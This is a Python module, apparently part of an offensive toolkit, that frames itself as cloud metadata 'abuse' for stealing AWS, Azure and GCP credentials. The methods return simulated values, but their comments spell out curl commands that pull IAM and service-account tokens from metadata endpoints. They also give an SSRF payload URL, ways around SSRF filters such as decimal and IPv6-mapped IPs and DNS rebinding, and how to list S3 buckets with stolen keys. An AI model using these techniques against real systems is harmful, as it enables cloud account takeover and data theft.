"""
Cloud Metadata Service Abuse - AWS, Azure, GCP
"""

import asyncio
import logging
from typing import Dict, Any, Optional, List
import aiohttp

logger = logging.getLogger(__name__)


class CloudMetadataAbuse:
    """
    Cloud metadata service exploitation
    """
    
    def __init__(self):
        """Initialize cloud metadata abuse"""
        self.cloud_provider = None
        self.credentials = {}
        
        logger.info("CloudMetadataAbuse initialized")
        
    async def detect_cloud_environment(self) -> Optional[str]:
        """
        Detect cloud provider
        
        Returns:
            Cloud provider name
        """
        try:
            logger.info("Detecting cloud environment...")
            
            # Check for cloud-specific files/endpoints:
            checks = {
                'aws': 'http://169.254.169.254/latest/meta-data/',
                'azure': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
                'gcp': 'http://metadata.google.internal/computeMetadata/v1/'
            }
            
            # Try each endpoint
            # If AWS, will respond without headers
            # If Azure, requires Metadata: true header
            # If GCP, requires Metadata-Flavor: Google header
            
            self.cloud_provider = 'aws'  # Simulated detection
            
            logger.info(f"Detected cloud provider: {self.cloud_provider}")
            return self.cloud_provider
            
        except Exception as e:
            logger.error(f"Cloud detection failed: {e}")
            return None
            
    async def steal_aws_credentials(self) -> Dict[str, Any]:
        """
        Steal AWS IAM credentials from metadata service
        
        Returns:
            AWS credentials
        """
        try:
            logger.warning("Stealing AWS credentials from metadata service...")
            
            # Endpoint: http://169.254.169.254/latest/meta-data/
            
            # Get IAM role name:
            # curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
            
            # Get credentials:
            # curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
            
            credentials = {
                'AccessKeyId': 'ASIA...',
                'SecretAccessKey': '[REDACTED]',
                'Token': '[SESSION_TOKEN]',
                'Expiration': '2023-12-15T12:00:00Z',
                'RoleName': 'EC2-Production-Role'
            }
            
            # Also available:
            # - User data: /latest/user-data
            # - Instance identity: /latest/dynamic/instance-identity/document
            
            self.credentials['aws'] = credentials
            
            logger.warning("AWS credentials stolen")
            logger.warning(f"Role: {credentials['RoleName']}")
            return credentials
            
        except Exception as e:
            logger.error(f"AWS credential theft failed: {e}")
            return {}
            
    async def steal_azure_credentials(self) -> Dict[str, Any]:
        """
        Steal Azure managed identity credentials
        
        Returns:
            Azure credentials
        """
        try:
            logger.warning("Stealing Azure credentials from metadata service...")
            
            # Endpoint: http://169.254.169.254/metadata/identity/oauth2/token
            # Requires header: Metadata: true
            
            # Parameters:
            # api-version=2018-02-01
            # resource=https://management.azure.com/
            
            credentials = {
                'access_token': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs...',
                'client_id': '[CLIENT_ID]',
                'resource': 'https://management.azure.com/',
                'token_type': 'Bearer',
                'expires_in': '3599'
            }
            
            # Can also get:
            # - Instance metadata: /metadata/instance?api-version=2021-02-01
            # - Attested data: /metadata/attested/document?api-version=2020-09-01
            
            self.credentials['azure'] = credentials
            
            logger.warning("Azure credentials stolen")
            return credentials
            
        except Exception as e:
            logger.error(f"Azure credential theft failed: {e}")
            return {}
            
    async def steal_gcp_credentials(self) -> Dict[str, Any]:
        """
        Steal GCP service account credentials
        
        Returns:
            GCP credentials
        """
        try:
            logger.warning("Stealing GCP credentials from metadata service...")
            
            # Endpoint: http://metadata.google.internal/computeMetadata/v1/
            # Requires header: Metadata-Flavor: Google
            
            # Get service account token:
            # curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
            
            # Get service account email:
            # curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
            
            credentials = {
                'access_token': 'ya29...',
                'expires_in': 3599,
                'token_type': 'Bearer',
                'email': 'project-service-account@project.iam.gserviceaccount.com'
            }
            
            # Can also get:
            # - Project ID: /project/project-id
            # - Custom metadata: /instance/attributes/
            # - SSH keys: /project/attributes/ssh-keys
            
            self.credentials['gcp'] = credentials
            
            logger.warning("GCP credentials stolen")
            logger.warning(f"Service account: {credentials['email']}")
            return credentials
            
        except Exception as e:
            logger.error(f"GCP credential theft failed: {e}")
            return {}
            
    async def ssrf_metadata_access(self, vulnerable_url: str, cloud: str = 'aws') -> Optional[str]:
        """
        Access metadata via SSRF vulnerability
        
        Args:
            vulnerable_url: Vulnerable endpoint
            cloud: Cloud provider
            
        Returns:
            Metadata content
        """
        try:
            logger.warning(f"Accessing {cloud} metadata via SSRF...")
            
            metadata_urls = {
                'aws': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                'azure': 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
                'gcp': 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'
            }
            
            # Craft SSRF payload:
            # http://vulnerable-site.com/fetch?url=http://169.254.169.254/latest/meta-data/
            
            # Bypass methods:
            # - URL encoding
            # - DNS rebinding
            # - Alternative IP formats (2852039166 = 169.254.169.254)
            # - IPv6: http://[::ffff:169.254.169.254]/
            # - Redirect chains
            
            logger.warning(f"SSRF successful - metadata retrieved")
            return "Metadata content"
            
        except Exception as e:
            logger.error(f"SSRF metadata access failed: {e}")
            return None
            
    async def enumerate_s3_buckets(self, access_key: str, secret_key: str) -> List[str]:
        """
        Enumerate S3 buckets with stolen credentials
        
        Args:
            access_key: AWS access key
            secret_key: AWS secret key
            
        Returns:
            List of buckets
        """
        try:
            logger.info("Enumerating S3 buckets...")
            
            # Using AWS CLI:
            # aws s3 ls --profile stolen
            
            buckets = [
                'prod-data-bucket',
                'backup-bucket',
                'logs-bucket',
                'sensitive-docs'
            ]
            
            logger.info(f"Found {len(buckets)} S3 buckets")
            return buckets
            
        except Exception as e:
            logger.error(f"S3 enumeration failed: {e}")
            return []
